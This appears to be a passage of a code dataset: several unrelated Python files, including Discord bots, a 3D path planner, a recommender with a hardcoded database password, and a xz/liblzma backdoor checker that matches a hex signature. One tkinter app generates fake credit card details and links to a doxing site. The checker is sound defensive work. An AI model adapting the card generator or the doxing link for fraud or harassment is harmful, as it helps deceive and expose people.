None:\n            self.TIMEZONE = tz\n            self._init_tz()\n        if debug is not None:\n            self.DEBUG = debug\n            self._configure_logging()\n        if proxy_file_path:\n            with open(self.PROXY_PATH, \"r\") as file:\n                self.PROXY_LIST = [line.strip() for line in file.readlines()]\n        if safe_mode is not None:\n            self.SAFE = safe_mode\n            self._init_safe()\n\n    def _init_tz(self, tz: str",
    "# -*- coding: utf-8 -*-\n\"\"\"_summary_.\n\nThis module contains the `YesNoView` class, which is a custom view for\ndisplaying a yes/no confirmation prompt in a Discord interaction.\nClasses:\n- YesNoView: A custom view for displaying a yes/no confirmation prompt.\n\"\"\"\n\n# pylint: disable=unused-argument\n\nimport disnake\n\nfrom db.sqlite_handler import add_message, update_message\n\n\nclass YesNoView(disnake.ui.View):\n    \"\"\"A custom view for displaying a yes/no confirmation prompt.\n\n    This view provides two buttons: \"Yes\" and \"No\".\n    When the \"Yes\" button is clicked,\n    it performs the specified action (add or update) based on the provided parameters.\n    When the \"No\" button is clicked,\n    it performs the opposite action.\n    Attributes:\n    - tag (str): The tag associated with the confirmation prompt.\n    - message (str): The message associated with the confirmation prompt.\n    - action (str): The action to perform when the \"Yes\"\n    button is clicked. Can be \"add\" or \"update\".\n    - user_id (Optional[int]): The ID of the user who initiated\n    the confirmation prompt. Defaults to None.\n    - server_id (Optional[int]): The ID of the server where the\n    confirmation prompt is displayed. Defaults to None.\n    \"\"\"\n\n    # pylint: disable=too-many-arguments\n    def __init__(self, tag, message, action=\"add\", user_id=None, server_id=None):\n        super().__init__()\n        self.tag = tag\n        self.message = message\n        self.action = action\n        self.user_id = user_id\n        self.server_id = server_id\n\n    @disnake.ui.button(\n        label=\"Yes\", style=disnake.ButtonStyle.green, custom_id=\"yes_button\"\n    )\n    async def confirm_yes(\n        self, button: disnake.ui.Button, interaction: disnake.MessageInteraction\n    ):\n        \"\"\"Callback function for the \"Yes\" button.\n\n        This function is called when the \"Yes\" button is clicked.\n        It performs the specified action (add or update)\n        based on the provided parameters.\n        Args:\n        - interaction (disnake.Interaction):\n        - button (disnake.ui.Button): The clicked button.\n        The interaction object representing the user's interaction with the view.\n        \"\"\"\n        message = f\"```\\n{self.message}\\n```\"\n        if self.action == \"add\":\n            await add_message(self.server_id, self.tag, message, self.user_id)\n            await interaction.response.send_message(\n                f\"Tag `{self.tag}` added with message: {message}\", ephemeral=True\n            )\n        elif self.action == \"update\":\n            await update_message(self.server_id, self.tag, message)\n            await interaction.response.send_message(\n                f\"Tag `{self.tag}` updated with message: {message}\", ephemeral=True\n            )\n        self.stop()\n\n    @disnake.ui.button(label=\"No\", style=disnake.ButtonStyle.red, custom_id=\"no_button\")\n    async def confirm_no(\n        self, button: disnake.ui.Button, interaction: disnake.Interaction\n    ):\n        \"\"\"Callback function for the \"No\" button.\n\n        This function is called when the \"No\" button is clicked.\n        It performs the opposite action of the specified action\n        (add or update) based on the provided parameters.\n        Args:\n        - button (disnake.ui.Button): The clicked button.\n        - interaction (disnake.Interaction):\n        The interaction object representing the user's interaction with the view.\n        \"\"\"\n        if self.action == \"add\":\n            await add_message(self.server_id, self.tag, self.message, self.user_id)\n            await interaction.response.send_message(\n                f\"Tag `{self.tag}` added with message: {self.message}\", ephemeral=True\n            )\n        elif self.action == \"update\":\n            await update_message(self.server_id, self.tag, self.message)\n            await interaction.response.send_message(\n                f\"Tag `{self.tag}` updated with message: {self.message}\", ephemeral=True\n            )\n        self.stop()\n",
    "import math\n\nimport matplotlib.pyplot as plt\nfrom scipy.interpolate import CubicSpline\nimport numpy as np\nimport time\n\n\n# \u8282\u70b9\u7c7b\nclass Node:\n    def __init__(self, point):\n        self.point = np.array(point)\n        self.parent = None\n        self.cost = 0\n\n\n# \u8d1d\u585e\u5c14\u66f2\u7ebf\u4f18\u5316\ndef bezier(final_path):\n    x = final_path[:, 0]\n    y = final_path[:, 1]\n    z = final_path[:, 2]\n    cs_x = CubicSpline(range(len(x)), x)\n    cs_y = CubicSpline(range(len(y)), y)\n    cs_z = CubicSpline(range(len(z)), z)\n    t = np.linspace(0, len(x) - 1, 1000)\n    x_new = cs_x(t)\n    y_new = cs_y(t)\n    z_new = cs_z(t)\n    fig = plt.figure()\n    ax = fig.add_subplot(111, projection='3d')\n    ax.scatter(x, y, z, c='b', marker='o', label='Original points')\n    ax.plot(x, y, z, c='y', label='Original path')\n    ax.plot(x_new, y_new, z_new, label='Interpolated points', color='r')\n    ax.set_xlabel('X')\n    ax.set_ylabel('Y')\n    ax.set_zlabel('Z')\n    plt.legend(loc='best')\n    plt.show()\n\n\nclass RRTStar3D:\n    def __init__(self, st, gl, ot, rand_area, step_size, max_iter, search_radius, safe_distance):\n        self.start = Node(st)  # \u8d77\u59cb\u70b9\n        self.goal = Node(gl)  # \u76ee\u6807\u70b9\n        self.obstacle_list = ot  # \u969c\u788d\u7269\u5217\u8868\n        self.min_rand = rand_area[0]  # \u968f\u673a\u751f\u6210\u70b9\u7684\u8303\u56f4\u6700\u5c0f\u503c\n        self.max_rand = rand_area[1]  # \u968f\u673a\u751f\u6210\u70b9\u7684\u8303\u56f4\u6700\u5927\u503c\n        self.origin_step_size = step_size\n        self.init_step_size = step_size  # \u521d\u59cb\u6b65\u957f\n        self.step_size = 0\n        self.max_iter = max_iter  # \u6700\u5927\u8fed\u4ee3\u6b21\u6570\n        self.search_radius = search_radius  # \u641c\u7d22\u534a\u5f84\n        self.safe_distance = safe_distance  # \u5b89\u5168\u8ddd\u79bb\n        self.node_list = []  # \u8bb0\u5f55\u6240\u6709\u63a2\u7d22\u5230\u7684\u70b9\n        self.step_size_history = []  # \u8bb0\u5f55\u6b65\u957f\u53d8\u5316\u7684\u5386\u53f2\u5217\u8868\n        self.distance_history = []  # \u8bb0\u5f55\u8ddd\u79bb\u76ee\u6807\u7684\u5386\u53f2\u5217\u8868\n        self.distance_to_goal = 999  # \u8bb0\u5f55\u5f53\u524d\u70b9\u5230\u76ee\u6807\u70b9\u7684\u8ddd\u79bb\n        self.collision_num = 0  # \u8bb0\u5f55\u78b0\u649e\u6b21\u6570\n\n    def generate_random_point(self):\n        # \u5728\u968f\u673a\u751f\u6210\u70b9\u7684\u8303\u56f4\u5185\u751f\u6210\u968f\u673a\u70b9\n        point = np.random.uniform(low=self.min_rand, high=self.max_rand, size=3)\n        return point\n\n    def nearest_node(self, point):\n        # \u627e\u5230\u8ddd\u79bb\u6307\u5b9a\u70b9\u6700\u8fd1\u7684\u8282\u70b9\u7684\u7d22\u5f15\n        distances = [np.linalg.norm(np.array(node.point) - np.array(point)) for node in self.node_list]\n        return np.argmin(distances)\n\n    def collision_detect(self, point1, point2):\n        for obstacle in self.obstacle_list:\n            obstacle_center = np.array(obstacle[0])\n            obstacle_radius = obstacle[1]\n            link1 = point2 - point1\n            link2 = obstacle_center - point1\n            link3 = obstacle_center - point2\n            judge = np.dot(link1, link2) / np.dot(link1, link1)\n            if 0 <= judge <= 1:  # \u5782\u8db3\u5728\u7ebf\u6bb5\u4e0a\n                distance = np.linalg.norm(np.cross(link1, link2)) / np.linalg.norm(link1)\n            else:  # \u5782\u8db3\u4e0d\u5728\u7ebf\u6bb5\u4e0a\n                distance = min(np.linalg.norm(link2), np.linalg.norm(link3))\n            if distance < obstacle_radius + self.safe_distance:\n                return False\n        return True\n\n    # \u68c0\u6d4b\u6700\u7ec8\u8def\u5f84\u662f\u5426\u4e0e\u969c\u788d\u7269\u53d1\u751f\u78b0\u649e\n    def test(self):\n        from_node = self.goal\n        to_node = from_node.parent\n        print(\"Testing path:\")\n        while to_node is not None:\n            print(\"from:\", from_node.point, \",to:\", to_node.point, \",collision free:\",\n                  self.collision_detect(from_node.point, to_node.point))\n            from_node = to_node\n            to_node = to_node.parent\n\n    # \u6839\u636e\u5f53\u524d\u63a2\u7d22\u65b9\u5411\u52a8\u6001\u8c03\u6574\u6b65\u957f\n    def adjust_step_size(self, from_node, to_node):\n\n        # \u8ba1\u7b97\u4e24\u4e2a\u5411\u91cf\n        vec1 = np.array(to_node.point) - np.array(from_node.point)\n        vec2 = np.array(self.goal.point) - np.array(from_node.point)\n        # \u8ba1\u7b97\u4e24\u4e2a\u5411\u91cf\u7684\u70b9\u79ef\n        dot_product = np.dot(vec1, vec2)\n        # \u8ba1\u7b97\u4e24\u4e2a\u5411\u91cf\u7684\u6a21\n        norm_vec1 = np.linalg.norm(vec1)\n        norm_vec2 = np.linalg.norm(vec2)\n        # \u8ba1\u7b97\u5939\u89d2\uff08\u5f27\u5ea6\uff09\n        cos_theta = dot_product / (norm_vec1 * norm_vec2)\n        # \u6d6e\u70b9\u6570\u8ba1\u7b97\u9519\u8bef\u68c0\u6d4b\n        # if cos_theta < -1 or cos_theta > 1:\n        #     print(\"Cos theta error\")\n        #     print(\"cos_theta:\", cos_theta)\n        #     print(\"vec1, vec2:\", vec1, vec2)\n        #     print(norm_vec1, norm_vec2)\n        #     print(to_node.point)\n        #     print(from_node.point)\n        #     print(self.goal.point)\n        theta_radians = np.arccos(np.clip(cos_theta, -1.0, 1.0))\n        # \u5c06\u5f27\u5ea6\u8f6c\u6362\u4e3a\u89d2\u5ea6\n        theta_degrees = np.degrees(theta_radians)\n        # \u8c03\u6574\u6b65\u957f\n        if theta_degrees < 90:\n            self.step_size = self.init_step_size * (1 + dot_product / (norm_vec1 * norm_vec2))\n        else:\n            self.step_size = self.init_step_size\n        self.step_size_history.append(self.step_size)\n        # print(\"cos:\", dot_product / (norm_vec1 * norm_vec2))\n\n        return vec1, norm_vec1\n\n    def steer(self, from_node, to_node):\n        # \u8c03\u6574\u6b65\u957f\n        direction, distance = self.adjust_step_size(from_node, to_node)\n        unit_direction = direction / distance\n        new_node_point = from_node.point + self.step_size * unit_direction\n        # \u4e24\u8282\u70b9\u95f4\u78b0\u649e\u68c0\u6d4b\n        if self.collision_detect(from_node.point, new_node_point):\n            new_node = Node(new_node_point)\n            new_node.pa",
    "import tkinter as tk\r\nimport webbrowser\r\nfrom faker import Faker\r\n\r\ndef zaloguj():\r\n    username = entry_username.get()\r\n    password = entry_password.get()\r\n\r\n    if username == \"Guns\" and password == \"Guns123\":\r\n        label_info.config(text=\"Successfully logged in!\", fg=\"green\")\r\n        root.withdraw()\r\n        otworz_aplikacje()\r\n    else:\r\n        label_info.config(text=\"Login error. Try again!\", fg=\"red\")\r\n\r\ndef otworz_aplikacje():\r\n    app_window = tk.Toplevel()\r\n    app_window.title(\"Guns Software\")\r\n\r\n    button_open_website = tk.Button(app_window, text=\"Open Website\", command=otworz_strone, font=(\"Arial\", 12))\r\n    button_open_website.pack(padx=10, pady=5)\r\n\r\n    frame_buttons = tk.Frame(app_window)\r\n    frame_buttons.pack(padx=10, pady=5)\r\n\r\n    button_generate_visa_card = tk.Button(frame_buttons, text=\"Generate Visa Card\", command=lambda: generuj_karte_kredytowa('visa'), font=(\"Arial\", 12))\r\n    button_generate_visa_card.grid(row=0, column=0, padx=5)\r\n\r\n    button_generate_mastercard = tk.Button(frame_buttons, text=\"Generate Mastercard\", command=lambda: generuj_karte_kredytowa('mastercard'), font=(\"Arial\", 12))\r\n    button_generate_mastercard.grid(row=0, column=1, padx=5)\r\n\r\ndef otworz_strone():\r\n    webbrowser.open_new(\"https://doxbin.net/\")\r\n\r\ndef generuj_karte_kredytowa(typ_karty):\r\n    fake = Faker()\r\n    if typ_karty == 'visa':\r\n        numer_karty = fake.credit_card_number(card_type='visa16')\r\n    elif typ_karty == 'mastercard':\r\n        numer_karty = fake.credit_card_number(card_type='mastercard')\r\n    \r\n    data_waznosci = fake.credit_card_expire(start=\"now\", end=\"+10y\", date_format=\"%m/%y\")\r\n    ccv = fake.credit_card_security_code(card_type=typ_karty)\r\n    \r\n    label_credit_card.config(text=f\"Generated {typ_karty.capitalize()} Credit Card: {numer_karty}\\nExpiration Date: {data_waznosci}\\nCCV: {ccv}\", font=(\"Arial\", 12), fg=\"blue\")\r\n    \r\n    zapisz_do_pliku(numer_karty, data_waznosci, ccv)\r\n\r\ndef zapisz_do_pliku(numer_karty, data_waznosci, ccv):\r\n    with open(\"GunsSoftware_credit_cards.txt\", \"a\") as file:\r\n        file.write(f\"Card Number: {numer_karty}, Expiration Date: {data_waznosci}, CCV: {ccv}\\n\")\r\n\r\nroot = tk.Tk()\r\nroot.title(\"Guns Software\")\r\n\r\nlabel_username = tk.Label(root, text=\"Username:\", font=(\"Arial\", 12))\r\nlabel_username.grid(row=0, column=0, padx=10, pady=5)\r\n\r\nentry_username = tk.Entry(root, font=(\"Arial\", 12))\r\nentry_username.grid(row=0, column=1, padx=10, pady=5)\r\n\r\nlabel_password = tk.Label(root, text=\"Password:\", font=(\"Arial\", 12))\r\nlabel_password.grid(row=1, column=0, padx=10, pady=5)\r\n\r\nentry_password = tk.Entry(root, show=\"*\", font=(\"Arial\", 12))\r\nentry_password.grid(row=1, column=1, padx=10, pady=5)\r\n\r\nbutton_login = tk.Button(root, text=\"Login\", command=zaloguj, font=(\"Arial\", 12))\r\nbutton_login.grid(row=2, column=0, columnspan=2, padx=10, pady=5)\r\n\r\nlabel_info = tk.Label(root, text=\"\", font=(\"Arial\", 12))\r\nlabel_info.grid(row=3, column=0, columnspan=2, padx=10, pady=5)\r\n\r\nlabel_credit_card = tk.Label(root, text=\"\", font=(\"Arial\", 12))\r\nlabel_credit_card.grid(row=4, column=0, columnspan=2, padx=10, pady=5)\r\n\r\nroot.mainloop()\r\n",
    "import random\n\nrock = '''\n    _______\n---'   ____)\n      (_____)\n      (_____)\n      (____)\n---.__(___)\n'''\n\npaper = '''\n    _______\n---'   ____)____\n          ______)\n          _______)\n         _______)\n---.__________)\n'''\n\nscissors = '''\n    _______\n---'   ____)____\n          ______)\n       __________)\n      (____)\n---.__(___)\n'''\n\n#Write your code below this line \ud83d\udc47\n\nfotos = [rock, paper, scissors]\nspieler_wahl  = int(input(\"Was w\u00e4hlst du?: (help, 0, 1, 2)\\n\").lower())\nprint(fotos[spieler_wahl])\n\ncomputer_wahl = random.randint(0,2)\nprint(\"Computer w\u00e4hlt: \")\nprint(fotos[computer_wahl])\n\n\n\nif spieler_wahl == \"help\":\n    print(\"0 = Rock, 1 = Paper, 2 = Scissors\")\n    exit()\nif int(spieler_wahl) >= 3 or int(spieler_wahl) < 0 :\n    print(\"Ung\u00fcltige Eingabe\")\n    exit()\n\nspieler_wahl = int(spieler_wahl)\n\nif spieler_wahl == 0 and computer_wahl == 2:\n    print(\"Du gewinnst!\")\nelif computer_wahl == 0 and spieler_wahl == 2:\n    print(\"Computer gewinnt!\")\nelif computer_wahl > spieler_wahl:\n    print(\"Computer gewinnt!\")\nelif spieler_wahl > computer_wahl:\n    print(\"Du gewinnst!\")\nelse:\n    print(\"Unentschieden!\")    \n",
    "import pymysql\r\nimport pandas as pd\r\nimport numpy as np\r\nimport re\r\nfrom gensim.models import TfidfModel\r\nimport gensim, logging\r\nfrom gensim.models.doc2vec import Doc2Vec, TaggedDocument\r\nimport jieba\r\nfrom functools import reduce\r\nimport collections\r\n\r\n# \u83b7\u53d6mysql\u7684\u8fde\u63a5\r\nconn = pymysql.connect(\r\n    host=\"127.0.0.1\",  # \u9700\u8981\u8fde\u63a5\u7684\u6570\u636e\u5e93\u7684ip\r\n    port=3306,\r\n    user=\"root\",  # \u6570\u636e\u5e93\u7528\u6237\u540d\r\n    password=\"123456\",  # \u6570\u636e\u5e93\u5bc6\u7801\r\n    database=\"gouwuwang_db\",  # \u9700\u8981\u67e5\u8be2\u7684\u6570\u636e\u5e93\u540d\r\n)\r\n\r\ndef remove_punctuation(text):\r\n    '''\u5220\u9664\u6807\u70b9\u7b26\u53f7\u548c\u7a7a\u683c'''\r\n    # return re.sub('[^\\w\\s]', '', text)\r\n    text = re.sub(' ', '', text)\r\n    text = re.sub('[^\\w\\s]', '', text)\r\n    return text\r\n\r\n\r\ndef remove_html_tags(text):\r\n    text = re.sub('&nbsp;', '', text)\r\n    clean = re.compile('<.*?>')\r\n    return re.sub(clean, '', text)\r\n\r\n\r\n# \u8bbe\u7f6e Pandas \u6253\u5370\u9009\u9879\r\npd.set_option('display.max_rows', None)  # \u663e\u793a\u6240\u6709\u884c\r\npd.set_option('display.max_columns', None)  # \u663e\u793a\u6240\u6709\u5217\r\npd.set_option('display.width', None)  # \u4e0d\u6298\u53e0\u5355\u5143\u683c\r\n#pd.set_option('display.max_colwidth', None)  # \u663e\u793a\u5b8c\u6574\u7684\u5355\u5143\u683c\u5185\u5bb9\r\n\r\n'''\r\n- \u67e5\u8be2mysql\u6570\u636e\u5e93\u52a0\u8f7d\u7269\u54c1\u76f8\u5173\u8868\u7684\u6570\u636e\r\n- \u5229\u7528jieba\u5206\u8bcd\u7269\u54c1\u7684\u63cf\u8ff0\u5b57\u6bb5\u548c\u5206\u7c7b\u5b57\u6bb5\uff0c\r\n- \u5e76\u5c06\u7269\u54c1\u7684\u5206\u7c7b\u8bcd\u548c\u63cf\u8ff0\u5206\u8bcd\u4f5c\u4e3a\u7269\u54c1\u7684\u6807\u7b7e\r\n'''\r\ndef get_item_dataset():\r\n    query_sql = \"SELECT t_product.productId as itemId,t_product.productName as title,t_productclass.className as genres,t_product.productDesc as itemDesc FROM t_product inner join t_productclass on t_productclass.classId = t_product.productClassObj\"\r\n    items_df = pd.read_sql_query(query_sql,conn,index_col=\"itemId\")\r\n\r\n    items_df[\"itemDesc\"] = items_df[\"itemDesc\"].apply(lambda x: remove_html_tags(x))\r\n    items_df[\"itemDesc\"] = items_df[\"itemDesc\"].apply(lambda x: remove_punctuation(x))\r\n    items_df[\"itemDesc\"] = items_df[\"itemDesc\"].apply(lambda x: list(jieba.cut(x)))\r\n    # \u5c06\u7c7b\u522b\u8bcd\u5206\u5f00\r\n    items_df[\"genres\"] = items_df[\"genres\"].apply(lambda x: x.split(\"|\"))\r\n\r\n    # \u6784\u5efa\u6570\u636e\u96c6\uff0c\u5305\u542bId\u3001\u6807\u9898\u3001\u7c7b\u522b\u3001\u6807\u7b7e\u56db\u4e2a\u5b57\u6bb5\r\n    # \u5982\u679c\u6ca1\u6709\u6807\u7b7e\u6570\u636e\uff0c\u90a3\u4e48\u5c31\u66ff\u6362\u4e3a\u7a7a\u5217\u8868\r\n    # map(fun,\u53ef\u8fed\u4ee3\u5bf9\u8c61)\r\n    item_dataset = pd.DataFrame(\r\n        map(\r\n            lambda x: (x[0], x[1], x[2], x[2] + x[3]) if x[3] is not np.nan else (x[0], x[1], x[2], []),\r\n            items_df.itertuples())\r\n        , columns=[\"itemId\", \"title\", \"genres\", \"tags\"]\r\n    )\r\n    item_dataset.set_index(\"itemId\", inplace=True)\r\n    return item_dataset\r\n\r\n\r\n'''\r\n- \u5229\u7528\u7269\u54c1\u8868\u4e2d\u6bcf\u4e2aItem\u7684\u63cf\u8ff0\u5206\u8bcd\u6807\u7b7e\u4f5c\u4e3a\u7269\u54c1\u7684\u5019\u9009\u5173\u952e\u8bcd\r\n- \u5229\u7528TF\u00b7IDF\u8ba1\u7b97\u6bcf\u90e8\u4e2a\u7684\u6807\u7b7e\u7684tfidf\u503c\uff0c\u9009\u53d6TOP-N\u4e2a\u5173\u952e\u8bcd\u4f5c\u4e3a\u7269\u54c1\u753b\u50cf\u6807\u7b7e\r\n- \u5e76\u5c06\u7269\u54c1\u7684\u5206\u7c7b\u8bcd\u76f4\u63a5\u4f5c\u4e3a\u6bcf\u4e2a\u7269\u54c1\u7684\u753b\u50cf\u6807\u7b7e\r\n'''\r\ndef create_item_profile(item_dataset):\r\n    '''\r\n    \u4f7f\u7528tfidf\uff0c\u5206\u6790\u63d0\u53d6topn\u5173\u952e\u8bcd\r\n    :param movie_dataset:\r\n    :return:\r\n    '''\r\n    dataset = item_dataset[\"tags\"].values\r\n\r\n    from gensim.corpora import Dictionary\r\n    # \u6839\u636e\u6570\u636e\u96c6\u5efa\u7acb\u8bcd\u888b\uff0c\u5e76\u7edf\u8ba1\u8bcd\u9891\uff0c\u5c06\u6240\u6709\u8bcd\u653e\u5165\u4e00\u4e2a\u8bcd\u5178\uff0c\u4f7f\u7528\u7d22\u5f15\u8fdb\u884c\u83b7\u53d6\r\n    dct = Dictionary(dataset)\r\n    # \u6839\u636e\u5c06\u6bcf\u6761\u6570\u636e\uff0c\u8fd4\u56de\u5bf9\u5e94\u7684\u8bcd\u7d22\u5f15\u548c\u8bcd\u9891\r\n    corpus = [dct.doc2bow(line) for line in dataset]\r\n    # \u8bad\u7ec3TF-IDF\u6a21\u578b\uff0c\u5373\u8ba1\u7b97TF-IDF\u503c\r\n    model = TfidfModel(corpus)\r\n\r\n    _item_profile = []\r\n    for i, data in enumerate(item_dataset.itertuples()):\r\n        itemId = data[0]\r\n        title = data[1]\r\n        genres = data[2]\r\n        # \u5f97\u5230\u6bcf\u4e2a\u7535\u5f71\u6807\u7b7e\u7684\u6bcf\u4e2a\u8bcd\u8bed\u7684\u8bcd\u5178\u7d22\u5f15\u548c\u6743\u91cd\uff0c\u7c7b\u4f3c[(0, 0.17342978500637887), (1, 0.21562355612017706), (2, 0.21205621229134275), (3, 0.1335891911679789), (4, 0.2004362408431816), (5, 0.34531665530514855), (6, 0.837374709121301)]\r\n        vector = model[corpus[i]]\r\n        #\u6309\u7167TF - IDF\u503c\u5f97\u5230top - n\u7684\u5173\u952e\u8bcd\r\n        item_tags = sorted(vector, key=lambda x: x[1], reverse=True)[:30]\r\n        topN_tags_weights = dict(map(lambda x: (dct[x[0]], x[1]), item_tags))\r\n        # \u5c06\u7c7b\u522b\u8bcd\u7684\u6dfb\u52a0\u8fdb\u53bb\uff0c\u5e76\u8bbe\u7f6e\u6743\u91cd\u503c\u4e3a1.0\r\n        for g in genres:\r\n            topN_tags_weights[g] = 1.0\r\n        topN_tags = [i[0] for i in topN_tags_weights.items()]\r\n        _item_profile.append((itemId, title, topN_tags, topN_tags_weights))\r\n\r\n    item_profile = pd.DataFrame(_item_profile, columns=[\"itemId\", \"title\", \"profile\", \"weights\"])\r\n    item_profile.set_index(\"itemId\", inplace=True)\r\n    return item_profile\r\n\r\n#\u83b7\u53d6\u7269\u54c1\u6570\u636e\u96c6\r\nitem_dataset = get_item_dataset()\r\nprint(item_dataset.head())\r\nprint(\"*\"*200)\r\n#\u8ba1\u7b97\u7269\u54c1\u753b\u50cf\r\nitem_profile = create_item_profile(item_dataset)\r\nprint(\"\u7269\u54c1\u753b\u50cf\uff1a\",item_profile.head())\r\nprint(\"*\"*200)\r\n\r\nlogging.basicConfig(format='%(asctime)s : %(levelname)s : %(message)s', level=logging.INFO)\r\nsentences = list(item_profile[\"profile\"].values)\r\n#model = gensim.models.Word2Vec(sentences, window=3, min_count=1, iter=20)\r\nmodel = gensim.models.Word2Vec(sentences, window=3, min_count=1, epochs=20)\r\n#words = input(\"\u8bf7\u8f93\u5165\u4f60\u611f\u5174\u8da3\u7684\u8bcd\u8bed: \")  # action\r\n#ret = model.wv.most_similar(positive=[words], topn=10)\r\n#print(ret)\r\nprint(\"\u7269\u54c1\u8bb0\u5f55\u6570\uff1a\",len(item_profile[\"profile\"]))\r\ndocuments = [TaggedDocument(words, [itemId]) for itemId, words in item_profile[\"profile\"].iteritems()]\r\n#documents = [TaggedDocument(words, [itemId]) for itemId, words in item_dataset[\"tags\"].iteritems()]\r\n# \u8bad\u7ec3\u6a21\u578b\u5e76\u4fdd\u5b58\r\nmodel = Doc2Vec(documents, vector_size=100, window=3, min_count=1, workers=4, epochs=20)\r\nfrom gensim.test.utils import get_tmpfile\r\nfname = get_tmpfile(\"my_doc2vec_model\")\r\nmodel.save(fname)\r\n\r\ncursor = conn.cursor()\r\ncursor.execute('delete from t_similar_item')\r\nconn.commit()\r\n\r\nfor item_id, row in item_profile.iterrows():\r\n    words= row[\"profile\"]\r",
    "import subprocess\nfrom loguru import logger\n\n\nVERSAO_VULNERAVEL = [\"5.6.0\", \"5.6.1\"]\n\n\ndef verificar_caminho_sshd():\n    try:\n        caminho_sshd = subprocess.run([\n            \"whereis\",\n            \"-b\",\n            \"sshd\"],\n            capture_output=True\n        )\n        caminho_sshd = caminho_sshd.stdout\n        retorno = caminho_sshd.decode(\"utf-8\").replace(\"\\n\", \"\")\n        retorno = retorno.split()\n        logger.info(f\"Caminho verificado: {retorno}\")\n        return retorno[1]\n    except Exception as e:\n        logger.error(e)\n        return False\n\n\ndef verificar_liblzma(path_sshd):\n    try:\n        logger.info(f\"Verificando ldd: {path_sshd}\")\n        ldd_output = subprocess.run([\"ldd\", path_sshd], capture_output=True)\n        ldd_output = ldd_output.stdout\n        path_liblzma = ldd_output.decode(\"utf-8\").split()\n        retorno_lista = list(filter(lambda x: 'liblzma' in x, path_liblzma))\n        logger.info(f\"Lista: {retorno_lista}\")\n        return retorno_lista[1]\n    except Exception as e:\n        logger.error(e)\n        return False\n\n\ndef verificar_xz():\n    try:\n        caminho_xz = subprocess.run([\n            \"whereis\",\n            \"-b\",\n            \"xz\"],\n            capture_output=True\n        )\n        caminho_xz = caminho_xz.stdout\n        logger.info(caminho_xz)\n        retorno = caminho_xz.decode(\"utf-8\").replace(\"\\n\", \"\")\n        retorno = retorno.split()\n        logger.info(f\"Caminho verificado: {retorno}\")\n        return retorno[1]\n    except Exception as e:\n        logger.error(e)\n        return False\ndef conferir_assinatura(path):\n    hex_dump_liblzma = subprocess.run([\n        \"hexdump\",\n        \"-ve\",\n        '1/1 \\\"%02x\\\"',\n        path],\n        capture_output=True\n    )\n    hex_dump_liblzma = hex_dump_liblzma.stdout\n    if \"f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410\" in hex_dump_liblzma.decode(\"utf-8\"):\n        logger.warning(\"Assinatura da liblzma: VULNERAVEL\")\n    else:\n        logger.success(\"Assinatura da liblzma: OK\")\n\ndef conferir_xz_versao():\n    versao_xz = subprocess.run([\n        \"xz\",\n        \"--version\"\n    ],\n    capture_output=True)\n    versao_xz = versao_xz.stdout\n    versao_local = versao_xz.decode(\"utf-8\").split()\n    if versao_local[1] in VERSAO_VULNERAVEL:\n        logger.warning(\"xz VULNERAVEL\")\n    else:\n        logger.success(\"xz OK\")\n\n\nif __name__ == \"__main__\":\n    logger.info(\"Inicializando CVE...\")\n    vh = verificar_caminho_sshd()\n    vl = verificar_liblzma(vh)\n    conferir_assinatura(vl)\n    vz = verificar_xz()\n    conferir_xz_versao()\n    logger.info(\"Encerrando CVE...\")",
    "import discord\nfrom discord import app_commands\nfrom discord.ext import commands\nfrom Utils.Genshin.cookie import *\n\nimport exception as exc\nfrom typing import List, Optional\nfrom datetime import datetime\n\nimport matplotlib.pyplot as plt\nimport matplotlib.font_manager as fm\n\nclass Dirary(commands.Cog):\n    def __init__(self, bot: commands.Bot):\n        self.bot = bot\n\n    # \uc6d0\uc11d \uc218\uc785 \uad6c\uc131 \uc6d0\ud615\ucc28\ud2b8\n    def create_pie_chart(self, categories: List[genshin.models.genshin.DiaryActionCategory], channel_id: int, user_id = int) -> None:\n        labels = []\n        values = [c.percentage for c in categories]\n\n        for c in categories:\n            labels.append(f\"{c.name} ({c.percentage}%)\")\n        \n        fontPath = \"/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf\"\n        plt.rc(\"font\", family=fm.FontProperties(fname=fontPath).get_name())\n        plt.pie(x=values, wedgeprops={'linewidth': 1.5, 'edgecolor': 'white'})\n        plt.legend(loc=\"center right\",  labels=labels, bbox_transform=plt.gcf().transFigure, bbox_to_anchor=(0.9, 0.5))\n        plt.subplots_adjust(left=0.0, bottom=0.1, right=0.7)\n\n        try:\n            plt.savefig(f\"images/diary/{channel_id}/{user_id}_diary.png\", bbox_inches=\"tight\")\n        except FileNotFoundError:\n            os.mkdir(f\"{os.path.abspath('')}/images/diary/{channel_id}\")\n            plt.savefig(f\"images/diary/{channel_id}/{user_id}_diary.png\", bbox_inches=\"tight\")\n\n    @app_commands.command(name=\"\uc77c\uc9c0\", description=\"\uc5ec\ud589\uc790 \ud578\ub4dc\ubd81\uc744 \ud655\uc778\ud569\ub2c8\ub2e4.\")\n    @app_commands.describe(month = \"\ud655\uc778\ud560 \uc6d4\uc744 \uc785\ub825\ud569\ub2c8\ub2e4. \ubc94\uc704: \ud604\uc7ac \uc6d4 - 2, \uae30\ubcf8\uac12: \ud604\uc7ac \uc6d4\")\n    async def diary(self, interaction: discord.Interaction, month: Optional[int]):\n        if month == None:\n            month = datetime.today().month\n\n        try:\n            await interaction.response.defer()\n            client = get_genshin_client(user_id=interaction.user.id)\n\n            diary = await client.get_diary(lang=\"ko-kr\", month=month)\n            data: genshin.models.genshin.MonthDiaryData = diary.data\n\n            self.create_pie_chart(categories=data.categories, channel_id=interaction.channel_id, user_id=interaction.user.id)\n\n            embed = discord.Embed(title=f\"{diary.nickname}\ub2d8\uc758 \uc5ec\ud589\uc77c\uc9c0\", description=f\"uid: {diary.uid}\")\n            embed.set_thumbnail(url=\"https://webstatic.hoyoverse.com/upload/op-public/2022/08/04/ff1419346528dfd64d77c35701ecd106_7596171599082743274.png?x-oss-process=image%2Fresize%2Cs_600%2Fauto-orient%2C0%2Finterlace%2C1%2Fformat%2Cwebp%2Fquality%2Cq_80\")\n            file = discord.File(f\"{os.path.abspath('')}/images/diary/{interaction.channel_id}/{interaction.user.id}_diary.png\", filename=f\"{interaction.user.id}_diary.png\")\n            embed.set_image(url=f\"attachment://{interaction.user.id}_diary.png\")\n            embed.add_field(name=f\"{month}\uc6d4 \uc6d0\uc11d/\ubaa8\ub77c \uc218\uc785\", value=f\"\uc6d0\uc11d: {data.current_primogems}\\n\ubaa8\ub77c: {data.current_mora}\", inline=False)\n            embed.add_field(name=\"\uc6d0\uc11d \uc218\uc785 \uad6c\uc870\", value=\"\", inline=False)\n\n            await interaction.followup.send(file=file, embed=embed)\n\n            try:\n                